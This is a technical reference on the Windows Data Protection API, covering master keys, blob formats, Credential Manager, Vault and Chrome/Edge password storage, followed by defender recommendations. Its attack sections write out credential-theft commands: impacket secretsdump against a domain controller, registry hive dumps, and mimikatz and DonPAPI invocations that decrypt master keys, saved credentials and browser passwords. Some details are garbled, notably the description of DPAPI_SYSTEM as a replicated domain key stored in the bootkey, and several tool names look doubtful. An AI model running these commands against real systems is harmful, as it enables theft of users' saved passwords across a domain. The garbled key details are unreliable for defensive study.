# DPAPI Architecture

## What it is

The Data Protection API (DPAPI) is a built-in Windows cryptographic API that enables applications to encrypt data transparently using user or machine credentials. It is used extensively throughout Windows and third-party applications to protect:

- Windows credentials (Credential Manager)
- Internet Explorer/Edge saved passwords
- Chrome, Firefox, and other browser passwords
- EFS (Encrypting File System) keys
- Wi-Fi profile passwords
- RDP saved credentials
- Outlook/Exchange cached credentials
- Internet Information Services (IIS) configuration secrets
- Backup keys for Active Directory Certificate Services
- Vault credential blobs (Windows Vault)

## DPAPI purpose

DPAPI solves the **key management problem**: instead of applications managing encryption keys, DPAPI derives keys from the user's password or the machine's domain-joined state.

- **User DPAPI:** Protected data is accessible only by the same user session
- **Machine DPAPI:** Protected data is accessible by any process running as SYSTEM on the machine

## Master key

The master key is the root encryption key for DPAPI. It is a 512-bit (64-byte) random key generated per user.

### Master key generation

```
MasterKey = CryptGenRandom(64 bytes)

Stored as:
  %APPDATA%\Microsoft\Protect\<UserSID>\<MasterKeyGUID>
  (for user DPAPI)

  %SystemRoot%\System32\Microsoft\Protect\S-1-5-18\
  (for machine DPAPI / SYSTEM account)
```

### Master key protection

The master key itself is encrypted with another key derived from the user's password (or the machine's password for machine DPAPI).

**Encryption chain:**

```
User Password
     |
PBKDF2(SHA1, Password + Salt, iterations=4000+)
     |
Derived Key (encrypts master key)
     |
Master Key (64 bytes random)
     |
Derived per-application key (encrypts data)
```

### Master key file (Preferred file)

Each master key file has a corresponding `<MasterKeyGUID>.Preferred` file that indicates the preferred master key to use.

```
Directory: %APPDATA%\Microsoft\Protect\S-1-5-21-...-1234\
+-- <GUID1>            (master key v1, older)
+-- <GUID1>.Preferred  (pointer to preferred key)
+-- <GUID2>            (master key v2, newer)
+-- <GUID2>.Preferred
```

### Master key file structure (v2 format)

```
+---------------------------------------------------+
| DPAPI Master Key File                             |
|                                                   |
|  Header (32 bytes):                               |
|    dwVersion           : 2                        |
|    guidMasterKey       : {GUID}                   |
|    guidKeyProv        : {GUID}                    |
|    dwMasterKeyLen      : 488 (master key size)    |
|    dwUnknown          : 0                         |
|                                                   |
|  Master Key Data (encrypted):                     |
|    [Encrypted with user-derived key]              |
|    - Salt (16 bytes)                              |
|    - Verifier (16 bytes)                          |
|    - MasterKey (64 bytes)                         |
|    - CREDHIST pointer (if available)              |
|                                                   |
|  HMAC (32 bytes):                                 |
|    [SHA1 HMAC of all previous data]               |
|                                                   |
|  Users with access:                               |
|    - Current user's SID (encrypted with password) |
|    - Domain recovery key (if domain-joined)       |
|                                                   |
+---------------------------------------------------+
```

## DPAPI protection levels

### Current User (CRYPTPROTECT_LOCAL_MACHINE = false)

- Master key stored in `%APPDATA%\Microsoft\Protect\<UserSID>\`
- Key derived from user's password hash
- Only the user can unprotect data in their own session
- Data is inaccessible if the user changes password (unless recovery key is used)

### Local Machine (CRYPTPROTECT_LOCAL_MACHINE = true)

- Master key stored in `%SystemRoot%\System32\Microsoft\Protect\S-1-5-18\`
- Key derived from the machine's password (machine account hash)
- Any process running as SYSTEM on the same machine can unprotect
- Survives user logon/logoff but not machine reinstall

## DPAPI backup keys

### Credential History (CREDHIST)

When a user changes their password, DPAPI stores the previous master key decryption data in:

```
%APPDATA%\Microsoft\Protect\CREDHIST
```

This file stores the old password hashes so DPAPI can decrypt data encrypted with the old master key after a password change. **Crucially, this means old DPAPI data remains accessible.**

### Domain DPAPI backup keys

In an AD environment, domain controllers act as DPAPI backup key servers. When a user is domain-joined, DPAPI registers with the domain to store a **domain recovery key** that can decrypt the user's master key.

**Domain recovery key storage:**
- **DPAPI_SYSTEM** — a system secret stored on each DC in the Active Directory database
- It is a 64-byte random key stored in the `bootkey` (system key) in the registry
- The DPAPI_SYSTEM key is the same for all DCs in a domain (replicated)
- It can decrypt any DPAPI master key in the domain

**Attack angle:** The DPAPI_SYSTEM key can be extracted from a DC:
```bash
# Using impacket
impacket-secretsdump -just-dc CORP/jsith:password@DC01.corp.com
# Output includes:
# DPAPI_SYSTEM: <long hex string>
```

Or manually:
```bash
reg save HKLM\SYSTEM SYSTEM.hive
reg save HKLM\SECURITY SECURITY.hive
# Then extract bootkey + DPAPI_SYSTEM
```

## CryptProtectData / CryptUnprotectData

### CryptProtectData

```c
DATA_BLOB DataIn = {pbData, cbData};  // Plaintext to protect
DATA_BLOB DataOut;                      // Encrypted blob
DATA_BLOB PromptOpts;                   // Optional prompt
CRYPTPROTECT_PROMPTSTRUCT Prompt;       // Prompt config

CryptProtectData(
    &DataIn,
    L"Description",       // Optional description
    &OptionalEntropy,     // Optional entropy (salt)
    NULL,                 // Reserved
    &Prompt,
    CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_LOCAL_MACHINE,
    &DataOut
);
```

**Output blob structure:**

```
+---------------------------------------------------+
| DPAPI Blob (protected data)                       |
|                                                   |
|  dwVersion        : 2 or 3                        |
|  guidStorageProvider : {GUID} (which key type)    |
|  dwAlgID          : CALG_AES_256 or CALG_3DES    |
|  dwAlgHash        : CALG_SHA1 or CALG_SHA256     |
|  dwPromptFlags    : prompt behavior               |
|  OptionalEntropy  : added entropy (if used)       |
|  Description      : description string            |
|                                                   |
|  Encrypted Data:                                  |
|    - Salt (16 bytes)                              |
|    - HMAC (20 bytes for SHA1)                     |
|    - Ciphertext (variable)                        |
|                                                   |
+---------------------------------------------------+
```

### CryptUnprotectData

```c
CryptUnprotectData(
    &DataIn,              // The encrypted blob
    &Description,         // Returns description
    &OptionalEntropy,     // Same entropy as used to protect
    NULL,                 // Reserved
    &Prompt,
    CRYPTPROTECT_UI_FORBIDDEN,
    &DataOut              // Decrypted plaintext
);
```

### PowerShell interface

```powershell
# Protect data (current user)
$data = [Text.Encoding]::UTF8.GetBytes("S3cr3tP@ssw0rd")
$encrypted = [Security.Cryptography.ProtectedData]::Protect(
    $data, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser
)

# Unprotect data
$decrypted = [Security.Cryptography.ProtectedData]::Unprotect(
    $encrypted, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser
)
[Text.Encoding]::UTF8.GetString($decrypted)
```

## Credential Blob

Windows Credential Manager stores credentials in **credential blobs** (DPAPI-protected files).

### Storage location

```
%APPDATA%\Microsoft\Credentials\<CredentialGUID>
```

### Credential blob structure

```
+---------------------------------------------------+
| Credential Blob                                   |
|                                                   |
|  - Credential Type (CRED_TYPE_GENERIC, etc.)      |
|  - Target Name (e.g., "Domain:target=server")     |
|  - Persist (Session, Local Machine, Enterprise)   |
|  - User Name (saved username)                     |
|  - Credential Blob (DPAPI-encrypted password)     |
|  - Comment                                        |
|  - Attributes                                     |
|                                                   |
+---------------------------------------------------+
```

### Credential manager types

| Type | Description | Storage |
|------|-------------|---------|
| Windows credentials | Domain/network passwords | %APPDATA%\Microsoft\Credentials |
| Certificate-based | Certificate references | Certificate store |
| Generic credentials | Application-specific | %APPDATA%\Microsoft\Credentials |
| Vault credentials | Modern app credentials | Windows Vault |

## Windows Vault

Windows Vault is the newer credential storage system (Windows 7+). It stores credentials in DPAPI-protected vault files.

### Vault structure

```
%APPDATA%\Microsoft\Vault\
+-- <VaultGUID>\
|   +-- Policy.vpol     (vault policy - encryption type, etc.)
|   +-- vault.vsch      (vault schema)
|   +-- vault.vcr       (vault credential resources - DPAPI encrypted)

%LocalAppData%\Microsoft\Vault\
+-- <VaultGUID>\
    +-- Policy.vpol
    +-- vault.vcr
```

### Vault credential types

- **Web credentials** - saved IE/Edge passwords
- **Windows credentials** - saved network passwords
- **Generic credentials** - application passwords

## Browser credential storage

### Chrome

Chrome stores passwords in a SQLite database with DPAPI protection:

```
%LocalAppData%\Google\Chrome\User Data\Default\Login Data
```

The `password_value` field in the `logins` table is DPAPI-encrypted with the current user's master key.

### Edge

Same as Chrome (based on Chromium):

```
%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data
```

### Firefox (NOT DPAPI)

Firefox uses its own Master Password-based encryption (PKCS11/NSS), not DPAPI.

## DPAPI with Active Directory

In domain environments, DPAPI has an additional recovery path:

1. When a user logs on for the first time, the machine contacts a DC
2. The DC has the **DPAPI_SYSTEM** key
3. The DC gives a **domain backup key** to the client (protected with Kerberos)
4. The domain backup key is stored in the user's master key file as an additional "user with access"
5. If the user's password changes, the domain backup key can still decrypt the master key

### Domain backup key extraction

The DPAPI_SYSTEM key is stored in the registry on DCs:

```
HKLM\SECURITY\Policy\PolSecret\EncryptedData\DPAPI_SYSTEM
```

This key is replicated to all DCs and is the **same** across all DCs in the domain.

### Shadow Backup Key attack (DPAPI_SYSTEM abuse)

If an attacker has DPAPI_SYSTEM, they can decrypt any DPAPI-protected data from any user in the domain (provided they have access to the user's master key file).

Attack flow:
1. Extract DPAPI_SYSTEM from DC (DCSync or local)
2. Extract user's master key file from their `%APPDATA%\Microsoft\Protect\<SID>\`
3. Decrypt master key using DPAPI_SYSTEM
4. Use master key to decrypt DPAPI blobs (Chrome passwords, credentials, etc.)

## Extracting and abusing DPAPI keys

### Mimikatz DPAPI commands

```cmd
# List master keys in the console
mimikatz "dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\<SID>\<GUID> /rpc"

# Decrypt with password
mimikatz "dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\<SID>\<GUID> /sid:<SID> /password:P@ssw0rd"

# Decrypt with domain backup key
mimikatz "dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\<SID>\<GUID> /dpapi_system:<hex>"

# List credential files
mimikatz "dpapi::cred /in:%APPDATA%\Microsoft\Credentials\*"

# Decrypt credential
mimikatz "dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID> /masterkey:<decrypted_mk>"

# Chrome/Edge
mimikatz "dpapi::chrome /in:%LocalAppData%\Google\Chrome\User Data\Default\Login Data /masterkey:<decrypted_mk>"
```

### Using impacket

```bash
# Extract DPAPI backup key (domain DPAPI_SYSTEM)
impacket-secretsdump -just-dc CORP/jsith:password@DC01.corp.com

# Decrypt master key
impacket-dpapilab -masterkey -sid S-1-5-21-... -password P@ssw0rd -file masterkey_file

# Decrypt credential blob
impacket-dpapilab -cred -masterkey <hex> -file credential_file
```

### Automated extraction

```bash
# Using DonPAPI (automated)
DonPAPI -u jsmith%password@corp.com -t all

# Using Eikar (offline)
python3 Eikar.py -d domain.corp -u jsmith -p password -target user
```

## How attackers abuse DPAPI

| Attack | Description |
|--------|-------------|
| **Master key decryption** | Extract user's master key via password, domain backup key, or user's password hash |
| **DPAPI_SYSTEM extraction** | Obtain the domain DPAPI backup key from a DC (DCSync) to decrypt all users' DPAPI data |
| **Credential blob decryption** | Decrypt `%APPDATA%\Microsoft\Credentials\*` files to extract saved passwords |
| **Browser password decryption** | Decrypt Chrome/Edge saved passwords using the user's master key |
| **Vault credential extraction** | Decrypt Windows Vault files (`vault.vcr`) for saved credentials |
| **CREDHIST abuse** | Use CREDHIST file to recover old master key after password change |
| **Machine DPAPI abuse** | Decrypt machine-encrypted DPAPI blobs (SYSTEM context) using machine account hash |
| **Shadow Backup Key** | Use DPAPI_SYSTEM to decrypt any domain user's DPAPI data |
| **Offline DPAPI decryption** | Extract master key files and decrypt them offline with known password/hash |
| **RDP credential theft** | Decrypt saved RDP credentials stored in DPAPI-protected `.rdg` files |
| **Wi-Fi password extraction** | Decrypt wireless profile passwords stored with DPAPI |

## Defender recommendations

1. **Protect the DPAPI_SYSTEM key** — this is the master key for the entire domain. Only Domain Admins should have access to DC registry hives.

2. **Audit DPAPI operations** — limited auditing available, but monitor for:
   - Unusual access to `%APPDATA%\Microsoft\Protect\*`
   - Use of mimikatz or other DPAPI extraction tools (event ID 4688)

3. **Enable Credential Guard** — isolates secrets in a virtualized container, protecting against DPAPI master key extraction from LSASS.

4. **Use Windows Defender Application Control (WDAC)** — block unauthorized tools that interact with DPAPI.

5. **Rotate credentials regularly** — if a user's DPAPI data is compromised, changing the password limits the window.

6. **Disable storage of credentials** via Group Policy:
   - "Network access: Do not allow storage of passwords and credentials for network authentication" = Enabled

7. **Use LSA Protection** — prevents non-Microsoft processes from accessing LSASS, including DPAPI secrets.

8. **Monitor for Chrome/Edge Login Data access** — these files are accessed by processes, and unauthorized reading may indicate DPAPI abuse.

9. **Restrict RDP credential caching** — set "Do not allow passwords to be saved" via Group Policy.

10. **Encrypt volumes with BitLocker** — prevents offline DPAPI key extraction from disk images.

## Relevant MS protocols

| Document | Description |
|----------|-------------|
| [MS-DPAPI] | Data Protection Application Programming Interface |
| [MS-BKUP] | Backup Key Remote Protocol (DPAPI domain backup) |
| [MS-BKRP] | DPAPI: Backup Key Retrieval Protocol |
| N/A | Windows Data Protection (DPAPI) - MSDN documentation |

